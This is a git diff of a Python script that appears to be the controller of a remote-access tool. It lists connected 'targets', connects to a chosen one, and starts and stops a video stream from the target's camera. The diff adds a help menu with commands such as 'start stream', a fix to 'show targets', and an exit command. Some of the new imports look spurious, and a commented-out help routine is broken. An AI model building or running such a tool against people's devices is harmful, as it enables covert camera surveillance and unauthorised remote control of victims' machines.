@@ -1,5 +1,7 @@
-from ast import While
+from ast import Lambda, While
 from lib2to3.pgen2.token import COMMA
+from this import d
+from tkinter import COMMAND
 import colorama
 import socket
 from vidstream import StreamingServer
@@ -8,6 +10,7 @@ import pandas
 from prettytable import PrettyTable
 import time
 import json
+import sys
 #from assets.colors import colors
 #from assets.symbols import *
 
@@ -18,6 +21,7 @@ CAMERA_STREAMING_PORT = 8989
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((HOST , PORT))
 server.listen(3)
+#colors class
 class colors (object):
     def red():
         return colorama.Fore.RED
@@ -32,12 +36,39 @@ class colors (object):
     def black():
         return colorama.Fore.BLACK
 
-CR = colors
+CR = colors #init the colors class
 Splus = f"{CR.red()}|<{CR.green()}+{CR.red()}>|{CR.white()}"
 Sminess = f"{CR.red()}|<{CR.yellow()}-{CR.red()}>|{CR.white()}"
 Swarning = f"{CR.red()}<|{CR.yellow()}!{CR.red()}>|{CR.white()}"
 Ssowrd = f"{CR.red()} ==> {CR.white()}"
 
+#help menu
+def help(TYPE):
+    COMMANDS_AND_USE_MAIN = {
+        f"{CR.green()}show targets" : f"{CR.blue()}command for showing connecteds targets",
+        #f"{CR.green()}start stream" : f"{CR.blue()}command used for start reciving video data from the target",
+        #f"{CR.green()}stop stream"  : f"{CR.blue()}command used to stop the stream services of reciving video data from the target {CR.red()}[if it already started !!]",
+        f"{CR.green()}connect" : f"{CR.blue()}command use to connect to a specified target {CR.yellow()}[it take one argumnet wich is the target host that you wannt to connect to]",
+        f"{CR.green()}help" : f"{CR.blue()}shows this help menu"
+    
+    }
+    COMMANDS_AND_USE_CS  = {
+        f"{CR.green()}show targets" : f"{CR.blue()}command for showing connecteds targets",
+        f"{CR.green()}start stream" : f"{CR.blue()}command used for start reciving video data from the target",
+        f"{CR.green()}stop stream"  : f"{CR.blue()}command used to stop the stream services of reciving video data from the target {CR.red()}[if it already started !!]",
+        f"{CR.green()}connect" : f"{CR.blue()}command use to connect to a specified target {CR.yellow()}[it take one argumnet wich is the target host that you wannt to connect to]",
+        f"{CR.green()}help" : f"{CR.blue()}shows this help menu"
+    }
+    """
+    if TYPE == "main":
+        HELP_TABLE = PrettyTable([f"{CR.green()}command{CR.white()}", f"{CR.green()}info{CR.white()}"])
+        X_ROW = []
+        for x in COMMANDS_AND_USE_MAIN:
+            X_ROW = x
+            info = COMMANDS_AND_USE_CS[x][0]
+        HELP_TABLE.add_row([str([d for x in X_ROW]) , str([y for y in info])])
+        print(HELP_TABLE)
+    """
 def StartCameraStreamingServer(host, port):
     global CAMERA_STREAMING    
     CAMERA_STREAMING = StreamingServer(host, port)
@@ -99,7 +130,7 @@ def run():
     print(f" {Splus} {CR.green()}Target added to list{CR.white()}")
     while True:   
         COMMAND_INPUT = input(f"\r   {CR.red()} <|{CR.green()}SERVER{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
-        if COMMAND_INPUT == "show target":
+        if COMMAND_INPUT == "show targets":
             TARGETS_SHOWER()
         elif COMMAND_INPUT.startswith("connect"):
             THE_ADDR = COMMAND_INPUT.replace("connect ", "")
@@ -109,5 +140,8 @@ def run():
                         connect_with_host(target_add=x)
             else:
                 print(f"{Sminess} {CR.red()}Target not specified{CR.white()}")
-
+        elif COMMAND_INPUT == "help":
+            help(TYPE="main")
+        elif COMMAND_INPUT == "exit":
+            server.close(); time.sleep(1); sys.exit()
 run()
